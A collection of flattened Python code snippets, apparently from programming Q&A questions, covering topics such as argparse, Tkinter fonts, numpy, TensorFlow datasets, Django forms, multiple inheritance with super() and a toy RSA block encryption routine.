"main_parser = argparse.ArgumentParser ( ) subparsers = main_parser.add_subparsers ( dest= '' parser_name '' ) y_subparser = subparsers.add_parser ( ' y ' ) y_options = y_subparser.add_argument ( 'any ' , nargs='* ' ) args = main_parser.parse_args ( ) if args.parser_name == ' y ' : command_string = ' '.join ( [ ' y ' ] + sys.argv [ 2 : ] ) os.system ( command_string )"
"> > > import re > > > reg = `` ( \w+ ' ? \s* ) + [ -|~ ] \s* ( ( \d+\. ? \d+\ $ ? ) | ( \ $ ? \d+\ . ? \d+ ) ) '' > > > re.search ( reg , `` **LOOKING FOR PAYPAL OFFERS ON THESE PAINTED UNCOMMONS** '' ) # Hangs here ..."
"from Tkinter import *from ttk import *import tkFontroot = Tk ( ) default = tkFont.Font ( root=root , name= '' TkTextFont '' , exists=True ) large = default.copy ( ) large.config ( size=36 ) style = Style ( root ) style.configure ( `` Large.TLabel '' , font=large ) root.title ( `` Font Test '' ) main_frame = Frame ( root ) Label ( main_frame , text= '' Large Font '' , style= '' Large.TLabel '' ) .pack ( ) main_frame.pack ( ) root.mainloop ( ) from Tkinter import *from ttk import *import tkFontdef define_styles ( root ) : default = tkFont.Font ( root=root , name= '' TkTextFont '' , exists=True ) large = default.copy ( ) large.config ( size=36 ) style = Style ( root ) style.configure ( `` Large.TLabel '' , font=large ) root = Tk ( ) root.title ( `` Font Test '' ) define_styles ( root ) main_frame = Frame ( root ) Label ( main_frame , text= '' Large Font '' , style= '' Large.TLabel '' ) .grid ( row=0 , column=0 ) main_frame.pack ( ) root.mainloop ( )"
"def mul ( x , y ) : return x * ymul2 = mul.__get__ ( 2 ) mul2 ( 3 ) # 6"
"from datetime import timeimport pytzCET = pytz.timezone ( 'CET ' ) Japan = pytz.timezone ( 'Japan ' ) t1 = time ( 1,2,3 , tzinfo=CET ) t2 = time ( 1,2,3 , tzinfo=Japan ) datetime.time ( 1 , 2 , 3 , tzinfo= < DstTzInfo 'CET ' CET+1:00:00 STD > ) datetime.time ( 1 , 2 , 3 , tzinfo= < DstTzInfo 'Japan ' JST+9:00:00 STD > ) t1 == t2 # - > True"
"def my_estimator_func ( ) : d0 = tf.data.TextLineDataset ( train_csv_0 ) .map ( _parse_csv_train ) d1 = tf.data.TextLineDataset ( train_csv_1 ) .map ( _parse_csv_train ) d2 = tf.data.TextLineDataset ( train_csv_2 ) .map ( _parse_csv_train ) d3 = tf.data.TextLineDataset ( train_csv_3 ) .map ( _parse_csv_train ) d4 = tf.data.TextLineDataset ( train_csv_4 ) .map ( _parse_csv_train ) d1 = d1.repeat ( class_weight [ 1 ] ) d2 = d2.repeat ( class_weight [ 2 ] ) d3 = d3.repeat ( class_weight [ 3 ] ) d4 = d4.repeat ( class_weight [ 4 ] ) dataset = d0.concatenate ( d1 ) .concatenate ( d2 ) .concatenate ( d3 ) .concatenate ( d4 ) dataset = dataset.shuffle ( 180000 ) # < - This is where the issue comes from dataset = dataset.batch ( 100 ) iterator = dataset.make_one_shot_iterator ( ) feature , label = iterator.get_next ( ) return feature , labeldef _parse_csv_train ( line ) : parsed_line= tf.decode_csv ( line , [ [ `` '' ] , [ ] ] ) filename = parsed_line [ 0 ] label = parsed_line [ 1 ] image_string = tf.read_file ( filename ) image_decoded = tf.image.decode_jpeg ( image_string , channels=3 ) # my_random_augmentation_func will apply random augmentation on the image . image_aug = my_random_augmentation_func ( image_decoded ) image_resized = tf.image.resize_images ( image_aug , image_resize ) return image_resized , label"
"> > A = zeros ( 1e9 , 1 , 'single ' ) ; > > B = A ( : ) ; > > B ( 1 ) = 1 ; > > tic ; isequal ( A , B ) ; toc ; Elapsed time is 0.000043 seconds . In [ 13 ] : A = zeros ( 1e9 , dtype='float32 ' ) In [ 14 ] : B = A.copy ( ) In [ 15 ] : B [ 0 ] = 1In [ 16 ] : % timeit all ( A==B ) 1 loops , best of 3 : 612 ms per loop In [ 12 ] : % timeit array_equal ( A , B ) 1 loops , best of 3 : 623 ms per loop"
"from pylab import *from mpl_toolkits.axisartist.grid_helper_curvelinear import GridHelperCurveLinearfrom mpl_toolkits.axisartist import Subplotbeta=logspace ( -1,1,500 ) Rd= { } for zeta in [ 0.01,0.1,0.2,0.7,1 ] : Rd [ zeta ] =beta/sqrt ( ( 1-beta*beta ) **2+ ( 2*beta*zeta ) **2 ) loglog ( beta , Rd [ zeta ] ) ylim ( [ 0.1,10 ] ) xlim ( [ 0.1,10 ] ) grid ( 'on ' , which='minor ' )"
// Returns the value 20x = round ( 20.49 ) // Returns the value 20x = round ( 20.5 ) // Returns the value -20x = round ( -20.5 ) // Returns the value -21x = round ( -20.51 ) // Returns the value 20x = Math.round ( 20.49 ) ; // Returns the value 21x = Math.round ( 20.5 ) ; // Returns the value -20x = Math.round ( -20.5 ) ; // Returns the value -21x = Math.round ( -20.51 ) ;
"import threadingimport timefrom mock import MagicMockdef f ( ) : time.sleep ( 0.1 ) def test_1 ( ) : mock = MagicMock ( side_effect=f ) nb_threads = 100000 threads = [ ] for _ in range ( nb_threads ) : thread = threading.Thread ( target=mock ) threads.append ( thread ) thread.start ( ) for thread in threads : thread.join ( ) assert mock.call_count == nb_threads , mock.call_counttest_1 ( ) Traceback ( most recent call last ) : File `` test1.py '' , line 24 , in < module > test_1 ( ) File `` test1.py '' , line 21 , in test_1 assert mock.call_count == nb_threads , mock.call_countAssertionError : 99994"
"index = pd.MultiIndex.from_product ( [ [ ' a ' , ' b ' ] , [ ' A ' , ' B ' ] , [ 'One ' , 'Two ' ] ] ) df = pd.DataFrame ( np.arange ( 16 ) .reshape ( 2 , 8 ) , columns=index ) df 0 a A One 0 Two 1 B One 2 Two 3 b A One 4 Two 5 B One 6 Two 71 a A One 8 Two 9 B One 10 Two 11 b A One 12 Two 13 B One 14 Two 15dtype : int64"
"class Person : def __init__ ( self , name ) : super ( ) .__init__ ( ) self.name = name > > > Person ( 'Tom ' ) < __main__.Person object at 0x7f34eb54bf60 > class Horse : def __init__ ( self , fur_color ) : super ( ) .__init__ ( ) self.fur_color = fur_colorclass Centaur ( Person , Horse ) : def __init__ ( self , name , fur_color ) : # ? ? ? now what ? super ( ) .__init__ ( name ) # throws TypeError : __init__ ( ) missing 1 required positional argument : 'fur_color ' Person.__init__ ( self , name ) # throws the same error"
"import numpy as npimport scipy as spimport scipy.statsimport matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import axes3d # generate some points of a 3D Gaussianpoints = np.random.normal ( size= ( 3 , 50 ) ) # do kernel density estimation to get smooth estimate of distribution # make grid of pointsx , y , z = np.mgrid [ -4:4:100j , -4:4:100j , -4:4:100j ] kernel = sp.stats.gaussian_kde ( points ) positions = np.vstack ( ( x.ravel ( ) , y.ravel ( ) , z.ravel ( ) ) ) density = np.reshape ( kernel ( positions ) .T , x.shape ) # now density is 100x100x100 ndarray # plot pointsax = plt.subplot ( projection='3d ' ) ax.plot ( points [ 0 , : ] , points [ 1 , : ] , points [ 2 , : ] , ' o ' ) # plot projection of density onto z-axisplotdat = np.sum ( density , axis=2 ) plotdat = plotdat / np.max ( plotdat ) plotx , ploty = np.mgrid [ -4:4:100j , -4:4:100j ] ax.contour ( plotx , ploty , plotdat , offset=-4 ) ax.set_xlim ( ( -4 , 4 ) ) ax.set_ylim ( ( -4 , 4 ) ) ax.set_zlim ( ( -4 , 4 ) ) # plot projection of density onto x-axisplotdat = np.sum ( density , axis=0 ) plotdat = plotdat / np.max ( plotdat ) ploty , plotz = np.mgrid [ -4:4:100j , -4:4:100j ] ax.contour ( ploty , plotz , plotdat , offset=-4 , zdir= ' x ' )"
"pip install twilio from twilio.rest import TwilioRestClientaccount_sid = `` MY TEST ACCOUNT SID '' auth_token = `` MY TEST ACCOUNT TOKEN '' client = TwilioRestClient ( account_sid , auth_token ) print `` running ! ! `` sms = client.sms.messages.create ( body= '' All in the game , yo '' , to= '' +91MYNUMBER '' , from_= '' +1MY_TWILIO_NUMBER '' ) print sms.sidprint sms.status runnnign ! ! SM3f51b1c3e5ad43d38bd548cfada14175queued"
"> > > def f1 ( x , y ) : > > > return ( x+y ) > > > y1 = 2 > > > f2 = lambda x : f1 ( x , y1 ) > > > f2 ( 1 ) 3 > > > y1 = 5 > > > f2 ( 1 ) 6"
"import torchfrom fairseq.models.wav2vec import Wav2VecModelcp = torch.load ( '/path/to/wav2vec.pt ' ) model = Wav2VecModel.build_model ( cp [ 'args ' ] , task=None ) model.load_state_dict ( cp [ 'model ' ] ) model.eval ( )"
"print os.listdir ( `` . '' ) # note that the file is displayed as `` N.txt '' print map ( os.path.exists , os.listdir ( `` . '' ) ) # note the file doesnt exists ? ? ?"
"class MyLayer ( Layer ) : def __init__ ( self , output_dim , **kwargs ) : self.output_dim = output_dim super ( MyLayer , self ) .__init__ ( **kwargs ) def build ( self , input_shape ) : # Create a trainable weight variable for this layer . self.kernel = self.add_weight ( name='kernel ' , shape= ( input_shape [ 1 ] , self.output_dim ) , initializer='uniform ' , trainable=True ) super ( MyLayer , self ) .build ( input_shape ) # Be sure to call this somewhere ! def call ( self , x ) : return K.dot ( x , self.kernel ) def compute_output_shape ( self , input_shape ) : return ( input_shape [ 0 ] , self.output_dim ) model.add ( MyLayer ( 4 , input_dim= ( 1 ) )"
"def encrypt_block ( block , block_size , e , n ) : number = int ( block,2 ) # convert to decimal number cipher_number = pow ( number , e , n ) # method for fastest exponentiation number^e mod n cipher_size = len ( bin ( cipher_number ) ) - 2 tmp_text = ' { 0 : b } '.format ( cipher_number ) while ( len ( tmp_text ) < block_size ) : # add zeros to left to fill until block_size tmp_text = `` 0 '' + tmp_text return tmp_text block_size = len ( bin ( n-1 ) ) - 2 # size of encrypted blocks text_size = block_size - 5 # size of clear text blocks tmp_text = `` '' # variable for holding current block encrypted_message = `` '' for i in data : if ( len ( tmp_text ) ==text_size ) : # when a block is complete tmp_text = encrypt_block ( ' 1'+tmp_text , block_size , e , n ) # add ' 1 ' so I don t loose left zeros encrypted_message += tmp_text tmp_text = `` '' if ( i == ' 0 ' or i == ' 1 ' ) : # just precaution so I won t add other characters tmp_text += i if ( tmp_text ! = `` '' ) : # in case last block isnt the clear text size tmp_text = encrypt_block ( ' 1'+tmp_text , block_size , e , n ) # add ' 1 ' so I don t loose left zeros encrypted_message += tmp_text print encrypted_message block_size = len ( bin ( n-1 ) ) - 2 tmp_text = `` '' decrypted_message = `` '' for i in data : if ( len ( tmp_text ) == block_size ) : number = int ( tmp_text,2 ) plain_number = pow ( number , d , n ) decrypted_message += ' { 0 : b } '.format ( plain_number ) [ 1 : : ] # remove the ' 1 ' that I added in all blocks to prevent loosing zeros if ( i == ' 1 ' or i == ' 0 ' ) : tmp_text += i print decrypted_message 11001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011110011001111001100111100110011 0101110010110010100110111010111011111001001101010110010100000110011011101111101111100000011110101101010000000001010110000111010101001000111100000011110110110011111001111000111000101011000000101111000100110100100100010100000000011101111110111101100011110011010001111000000101010010100111010010001000110010100111111000101001010101100010101001010000110010001101000111001111110010110111001000100101001000100100110011010101000111100101100111010110010000101111100111001001100110111110000100100001010100100110110100100011100010010100101000111011101101111110001000010111101111110000100001011100110010101111010010001011101000111100110101110111011100100001000010100011010001010111010000011100111100001110100100011100000101011011000001010001011101011111010110111001111001011001100001010010110000 0000110010111101000001100010110000010000110110111110001010110011100010111010111001100011110101100"
"class BaseScheduleForm ( forms.ModelForm ) : def __init__ ( self , *args , **kwargs ) : super ( BaseScheduleForm , self ) .__init__ ( *args , **kwargs ) self.fields [ 'day ' ] .widget = forms.HiddenInput ( ) self.fields [ 'user ' ] .widget = forms.HiddenInput ( ) class Meta : model = Schedule def clean_end_time ( self ) : start_time = self.cleaned_data.get ( 'start_time ' ) end_time = self.cleaned_data [ 'end_time ' ] if start_time and end_time : if end_time < = start_time : raise forms.ValidationError ( `` End time must be later that start time . '' ) return end_timeclass BaseScheduleFormset ( forms.models.BaseModelFormSet ) : def __init__ ( self , *args , **kwargs ) : super ( BaseScheduleFormset , self ) .__init__ ( *args , **kwargs ) for number , weekday in enumerate ( WEEKDAYS ) : self.forms [ number ] .day_name = weekday [ 1 ] def clean ( self ) : raise forms.ValidationError ( 'You must specify schedule for the whole week ' ) ScheduleFormset = forms.models.modelformset_factory ( Schedule , extra=7 , max_num=7 , form=BaseScheduleForm , formset=BaseScheduleFormset )"
"from herokutest.apps.otgcelery.tasks import addresult = add.delay ( 2,2 )"
"# ! /usr/bin/env pythonimport newdef myinit ( self , *args , **kwargs ) : print `` myinit called , args = % s , kwargs = % s '' % ( args , kwargs ) class myclass ( object ) : def __new__ ( cls , *args , **kwargs ) : ret = object.__new__ ( cls ) ret.__init__ = new.instancemethod ( myinit , ret , cls ) return ret def __init__ ( self , *args , **kwargs ) : print `` myclass.__init__ called , self.__init__ is % s '' % self.__init__ self.__init__ ( *args , **kwargs ) a = myclass ( ) $ python -- versionPython 2.6.6 $ ./mytest.pymyclass.__init__ called , self.__init__ is < bound method myclass.myinit of < __main__.myclass object at 0x7fa72155c790 > > myinit called , args = ( ) , kwargs = { }"
# LOGGING STUFF < -- - Should be here ? class SomeClass : def __init__ ( self ) : # class stuff # LOGGING STUFF < -- - Or should be here ? def some_method ( self ) : # method stuff # LOGGING SOME INFO def some_method2 ( self ) : # method stuff # LOGGING SOME INFO
"class TextServer ( object ) : def __init__ ( self , text_values ) : self.text_values = text_values # < more code > # < more methods > class TextServer ( object ) : def __init__ ( self , text_values ) : for text_value in text_values : assert isinstance ( text_value , basestring ) , u'All text_values should be str or unicode . ' assert 2 < = len ( text_value ) , u'All text_values should be at least two characters long . ' self.__text_values = frozenset ( text_values ) # < They should n't change. > # < more code > @ property def text_values ( self ) : # < 'text_values ' should n't be replaced. > return self.__text_values # < more methods >"
"from django.db import modelsfrom django.conf import settingsfrom PIL import Image as Imgfrom PIL import ExifTagsfrom io import BytesIOfrom django.core.files import Fileimport datetimeclass Work ( models.Model ) : owner = models.ForeignKey ( settings.AUTH_USER_MODEL , on_delete=models.CASCADE , null=True , blank=True ) title = models.CharField ( max_length=120 ) made_date = models.DateField ( default=datetime.date.today , null=True , blank=True ) note = models.TextField ( max_length=2000 , null=True , blank=True ) image = models.ImageField ( upload_to='work_pic ' , default='default_image.png ' ) def __str__ ( self ) : return self.title def save ( self , *args , **kwargs ) : if self.image : pilImage = Img.open ( BytesIO ( self.image.read ( ) ) ) for orientation in ExifTags.TAGS.keys ( ) : if ExifTags.TAGS [ orientation ] == 'Orientation ' : break exif = dict ( pilImage._getexif ( ) .items ( ) ) if exif [ orientation ] == 3 : pilImage = pilImage.rotate ( 180 , expand=True ) elif exif [ orientation ] == 6 : pilImage = pilImage.rotate ( 270 , expand=True ) elif exif [ orientation ] == 8 : pilImage = pilImage.rotate ( 90 , expand=True ) output = BytesIO ( ) pilImage.save ( output , format='JPEG ' , quality=75 ) output.seek ( 0 ) self.image = File ( output , self.image.name ( ) ) return super ( Work , self ) .save ( *args , **kwargs ) from rest_framework import serializersfrom .models import Workclass WorkSerializer ( serializers.ModelSerializer ) : owner = serializers.HiddenField ( default=serializers.CurrentUserDefault ( ) ) class Meta : model = Work fields = '__all__ ' def create ( self , validated_data ) : return Work.objects.create ( **validated_data )"
"def cartesian_2d ( arrays , out=None ) : arrays = [ np.asarray ( x ) for x in arrays ] dtype = arrays [ 0 ] .dtype n = np.prod ( [ x.shape [ 0 ] for x in arrays ] ) if out is None : out = np.empty ( [ n , len ( arrays ) , arrays [ 0 ] .shape [ 1 ] ] , dtype=dtype ) m = n // arrays [ 0 ] .shape [ 0 ] out [ : , 0 ] = np.repeat ( arrays [ 0 ] , m , axis=0 ) if arrays [ 1 : ] : cartesian_2d ( arrays [ 1 : ] , out=out [ 0 : m , 1 : , : ] ) for j in range ( 1 , arrays [ 0 ] .shape [ 0 ] ) : out [ j * m : ( j + 1 ) * m , 1 : ] = out [ 0 : m , 1 : ] return outa = [ [ 0 , -0.02 ] , [ 1 , -0.15 ] ] b = [ [ 0 , 0.03 ] ] result = cartesian_2d ( [ a , b , a ] ) // array ( [ [ [ 0. , -0.02 ] , [ 0. , 0.03 ] , [ 0. , -0.02 ] ] , [ [ 0. , -0.02 ] , [ 0. , 0.03 ] , [ 1. , -0.15 ] ] , [ [ 1. , -0.15 ] , [ 0. , 0.03 ] , [ 0. , -0.02 ] ] , [ [ 1. , -0.15 ] , [ 0. , 0.03 ] , [ 1. , -0.15 ] ] ] ) result [ : , 0 , : ] + result [ : , 1 , : ] - result [ : , 2 , : ] //array ( [ [ 0. , 0.03 ] , [ -1. , 0.16 ] , [ 1. , -0.1 ] , [ 0. , 0.03 ] ] )"
"from weakref import WeakSetse = WeakSet ( ) se.add ( 1 ) TypeError : can not create weak reference to 'int ' object from weakref import WeakSetse = WeakSet ( ) class Integer : def __init__ ( self , n=0 ) : self.n = ni = 1I = Integer ( 1 ) se.add ( i ) # failse.add ( I ) # ok"
+ -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- +| Header 1 | Long Header 2 that should wrap | Common column Header 3 | Header 4 | Header 5 | Header 6 | Header 7 | Header 8 || | + -- -- -- -- -- -+ -- -- -- -- -- -- + | | | | || | | Header 3a | Header 3b | | | | | |+==========+================================+===========+============+==========+==========+==========+==========+==========+| Value 1 | Value 2 does actually wrap | Value 3a | Value 3b | Value 4 | Value 5 | Value 6 | Value 7 | Value 8 |+ -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + + -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- +| Header 1 | Long Header 2 that should wrap | Header 3a | Header 3b | Header 4 | Header 5 | Header 6 | Header 7 | Header 8 || | | | | | | | | || | | | | | | | | |+==========+================================+===========+============+==========+==========+==========+==========+==========+| Value 1 | Value 2 does actually wrap | Value 3a | Value 3b | Value 4 | Value 5 | Value 6 | Value 7 | Value 8 |+ -- -- -- -- -- + -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- + -- -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- + -- -- -- -- -- +
"STATICFILES_DIRS = ( os.path.join ( PROJECT_ROOT , 'static/build ' ) , ) STATIC_ROOT = os.path.join ( PUBLIC_ROOT , 'static ' ) STATICFILES_FINDERS = ( 'django.contrib.staticfiles.finders.FileSystemFinder ' , )"
"mylist = [ 1,2,3 ] mylist + mylist [ 1 : ] [ 1 , 2 , 3 , 2 , 3 ] # not what I want mylist [ 0 ] =mylist [ [ ... ] , 2 , 3 ] # is this an infinite list ? [ [ 1,2,3 ] , 2 , 3 ]"
"from py2neo import neo4jdef add_test_nodes ( ) : # Add a test node manually alice = g.get_or_create_indexed_node ( `` Users '' , `` user_id '' , 12345 , { `` user_id '' :12345 } ) def do_batch ( graph ) : # Begin batch write transaction batch = neo4j.WriteBatch ( graph ) # get some updated node properties to add new_node_data = { `` user_id '' :12345 , `` name '' : `` Alice '' } # batch requests a = batch.get_or_create_in_index ( neo4j.Node , `` Users '' , `` user_id '' , 12345 , { } ) batch.set_properties ( a , new_node_data ) # < -- I 'm the problem # execute batch requests and clear batch.run ( ) batch.clear ( ) if __name__ == '__main__ ' : # Initialize Graph DB service and create a Users node index g = neo4j.GraphDatabaseService ( ) users_idx = g.get_or_create_index ( neo4j.Node , `` Users '' ) # run the test functions add_test_nodes ( ) alice = g.get_or_create_indexed_node ( `` Users '' , `` user_id '' , 12345 ) print alice do_batch ( g ) # get alice back and assert additional properties were added alice = g.get_or_create_indexed_node ( `` Users '' , `` user_id '' , 12345 ) assert `` name '' in alice > > > import py2neo > > > py2neo.__version__ ' 1.6.0 ' > > > g = py2neo.neo4j.GraphDatabaseService ( ) > > > g.neo4j_version ( 2 , 0 , 0 , u'M06 ' ) def do_batch ( graph ) : # Begin batch write transaction batch = neo4j.WriteBatch ( graph ) # get some updated node properties to add new_node_data = { `` user_id '' :12345 , `` name '' : `` Alice '' } # batch request 1 batch.get_or_create_in_index ( neo4j.Node , `` Users '' , `` user_id '' , 12345 , { } ) # execute batch request and clear alice = batch.submit ( ) batch.clear ( ) # batch request 2 batch.set_properties ( a , new_node_data ) # execute batch request and clear batch.run ( ) batch.clear ( )"
"class A ( object ) : def m ( self ) : print ' a'class B ( A ) : def m ( self ) : super ( B , self ) .m ( ) print ' b'class C ( B ) : def m ( self ) : super ( A , self ) .m ( ) print ' c ' a = A ( ) a.m ( ) ab = B ( ) b.m ( ) abc = C ( ) c.m ( ) ac AttributeError : 'super ' object has no attribute 'm '"
import mylibobj = mylib.MyClass ( )
"import numpy as npimport cv2cap = cv2.VideoCapture ( 0 ) # Define the codec and create VideoWriter object # fourcc = cv2.cv.CV_FOURCC ( *'DIVX ' ) # out = cv2.VideoWriter ( 'output.avi ' , fourcc , 20.0 , ( 640,480 ) ) out = cv2.VideoWriter ( 'output.avi ' , -1 , 20.0 , ( 640,480 ) ) while ( cap.isOpened ( ) ) : ret , frame = cap.read ( ) if ret==True : frame = cv2.flip ( frame,0 ) # write the flipped frame out.write ( frame ) cv2.imshow ( 'frame ' , frame ) if cv2.waitKey ( 1 ) & 0xFF == ord ( ' q ' ) : break else : break # Release everything if job is finishedcap.release ( ) out.release ( ) cv2.destroyAllWindows ( )"
"import asyncio async def special_function ( ) : while True : # does some work , # Passes control back to controller to run main_tasks # if they are no longer waiting . await asyncio.sleep ( 0 ) async def handler ( ) : tasks = [ task ( ) for task in main_tasks ] # Adding the task that I want to run when all main_tasks are awaiting : tasks.append ( special_function ( ) ) await asyncio.wait ( tasks ) asyncio.get_event_loop ( ) .run_until_complete ( handler ( ) )"
"years = [ 1990 , 1992 , 1995 , 1994 ] months = [ 1 , 6 , 3 , 7 ] days = [ 3 , 20 , 14 , 27 ]"
"all_bools = np.array ( [ [ False , True , True ] , [ True , True , True ] , [ False , False , True ] , [ False , False , False ] ] ) all_boolsarray ( [ [ False , True , True ] , # First true value = index 1 [ True , True , True ] , # First true value = index 0 [ False , False , True ] , # First true value = index 2 [ False , False , False ] ] ) # No True Values [ [ False , True , False ] , [ True , False , False ] , [ False , False , True ] , [ False , False , False ] ]"
"class Course : crn = course = title = tipe = cr_hours = seats = instructor = days = begin = end = location = exam = `` '' def __init__ ( self , pyQueryRow ) : self.crn = Course.get_column ( pyQueryRow , 0 ) self.course = Course.get_column ( pyQueryRow , 1 ) self.title = Course.get_column ( pyQueryRow , 2 ) self.tipe = Course.get_column ( pyQueryRow , 3 ) self.cr_hours = Course.get_column ( pyQueryRow , 4 ) self.seats = Course.get_column ( pyQueryRow , 5 ) self.instructor = Course.get_column ( pyQueryRow , 6 ) self.days = Course.get_column ( pyQueryRow , 7 ) self.begin = Course.get_column ( pyQueryRow , 8 ) self.end = Course.get_column ( pyQueryRow , 9 ) self.location = Course.get_column ( pyQueryRow , 10 ) self.exam = Course.get_column ( pyQueryRow , 11 ) def get_column ( row , index ) : return row.find ( 'td ' ) .eq ( index ) .text ( )"
"[ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] ] , [ [ 7 , 8 ] , [ 9 , 10 ] , [ 11 , 12 ] ] ] [ [ [ 1 , 2 ] , [ 7 , 8 ] ] , [ [ 3 , 4 ] , [ 9 , 10 ] ] , [ [ 5 , 6 ] , [ 11 , 12 ] ] ] > > > foo [ [ [ 1 , 2 ] , [ 3 , 4 ] , [ 5 , 6 ] ] , [ [ 7 , 8 ] , [ 9 , 10 ] , [ 11 , 12 ] ] ] > > > zip ( *foo ) [ ( [ 1 , 2 ] , [ 7 , 8 ] ) , ( [ 3 , 4 ] , [ 9 , 10 ] ) , ( [ 5 , 6 ] , [ 11 , 12 ] ) ]"
print ( x if x else 'no x available ' ) # compared to : print ( x and x or 'no x available ' )
"with freeze_time ( test_dt ) : lines_of_code_1 lines_of_code_2 lines_of_code_3 if test_dt : with freeze_time ( test_dt ) : lines_of_code_1 lines_of_code_2 lines_of_code_3else : lines_of_code_1 lines_of_code_2 lines_of_code_3 def do_thing ( ) : lines_of_code_1 lines_of_code_2 lines_of_code_3if test_dt : with freeze_time ( test_dt ) : do_thing ( ) else : do_thing ( ) class optional_freeze_time ( object ) : def __init__ ( self , test_dt=None ) : if test_dt : self.ctx_manager = freeze_time ( test_dt ) else : self.ctx_manager = None def __enter__ ( self , *args , **kwargs ) : if self.ctx_manager : self.ctx_manager.__enter__ ( *args , **kwargs ) def __exit__ ( self , *args , **kwargs ) : if self.ctx_manager : self.ctx_manager.__exit__ ( *args , **kwargs )"
"> > > { [ 1,2 ] :3 } TypeError : unhashable type : 'list ' > > > hash ( [ 1,2 ] ) TypeError : unhashable type : 'list '"
"map ( callback , pass_batch_into_callback=None , merge_future=None , **q_options ) @ ndb.taskletdef callback ( user ) : statistics = yield ndb.Key ( Statistics , user.key.id ( ) ) .get_async ( ) raise ndb.Return ( user , statistics ) result = User.query ( ) .map ( callback , produces_cursors=True )"
"Project1 main.py < -- - ( One of the projects that uses the library ) ... sharedlib __init__.py ps_lib.py another.py import osimport syssys.path.insert ( 0 , os.path.abspath ( '.. ' ) ) import sharedlib.ps_lib ..."
> > > x = np.int64 ( 2 ) - np.uint64 ( 1 ) > > > x1.0 > > > x.dtypedtype ( 'float64 ' )
"[ [ [ 1 2 ] [ 3 4 ] ] [ [ 5 6 ] [ 7 8 ] ] [ [ 9 10 ] [ 11 12 ] ] [ [ 5 6 ] [ 7 8 ] ] ] [ [ [ 1 2 ] [ 3 4 ] ] [ [ 5 6 ] [ 7 8 ] ] [ [ 9 10 ] [ 11 12 ] ] ] import numpy as npa = np.array ( [ [ [ 1,2 ] , [ 3,4 ] ] , [ [ 5,6 ] , [ 7,8 ] ] , [ [ 9,10 ] , [ 11,12 ] ] , [ [ 5,6 ] , [ 7,8 ] ] ] ) b = [ x.tostring ( ) for x in a ] print ( b ) c = np.array ( b ) print ( c ) print ( np.array ( [ np.fromstring ( x ) for x in c ] ) ) [ b'\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00 ' , b'\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00 ' , b'\t\x00\x00\x00\n\x00\x00\x00\x0b\x00\x00\x00\x0c\x00\x00\x00 ' , b'\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00 ' ] [ b'\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x04 ' b'\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08 ' b'\t\x00\x00\x00\n\x00\x00\x00\x0b\x00\x00\x00\x0c ' b'\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08 ' ] -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-86-6772b096689f > in < module > ( ) 5 c = np.array ( b ) 6 print ( c ) -- -- > 7 print ( np.array ( [ np.fromstring ( x ) for x in c ] ) ) < ipython-input-86-6772b096689f > in < listcomp > ( .0 ) 5 c = np.array ( b ) 6 print ( c ) -- -- > 7 print ( np.array ( [ np.fromstring ( x ) for x in c ] ) ) ValueError : string size must be a multiple of element size"
"def process_item ( self , item , spider ) : with self.connection.begin ( ) as conn : conn.execute ( insert ( table1 ) .values ( item [ 'part1 ' ] ) conn.execute ( insert ( table2 ) .values ( item [ 'part2 ' ] ) @ inlineCallbacksdef process_item ( self , item , spider ) : with self.connection.begin ( ) as conn : yield conn.execute ( insert ( table1 ) .values ( item [ 'part1 ' ] ) yield conn.execute ( insert ( table2 ) .values ( item [ 'part2 ' ] ) from alchimia import TWISTED_STRATEGYfrom sqlalchemy import ( create_engine , MetaData , Table , Column , Integer , String ) from sqlalchemy.schema import CreateTablefrom twisted.internet.defer import inlineCallbacksfrom twisted.internet.task import react @ inlineCallbacksdef main ( reactor ) : engine = create_engine ( `` sqlite : // '' , reactor=reactor , strategy=TWISTED_STRATEGY ) metadata = MetaData ( ) users = Table ( `` users '' , metadata , Column ( `` id '' , Integer ( ) , primary_key=True ) , Column ( `` name '' , String ( ) ) , ) # Create the table yield engine.execute ( CreateTable ( users ) ) # Insert some users yield engine.execute ( users.insert ( ) .values ( name= '' Jeremy Goodwin '' ) ) yield engine.execute ( users.insert ( ) .values ( name= '' Natalie Hurley '' ) ) yield engine.execute ( users.insert ( ) .values ( name= '' Dan Rydell '' ) ) yield engine.execute ( users.insert ( ) .values ( name= '' Casey McCall '' ) ) yield engine.execute ( users.insert ( ) .values ( name= '' Dana Whitaker '' ) ) result = yield engine.execute ( users.select ( users.c.name.startswith ( `` D '' ) ) ) d_users = yield result.fetchall ( ) # Print out the users for user in d_users : print `` Username : % s '' % user [ users.c.name ] if __name__ == `` __main__ '' : react ( main , [ ] )"
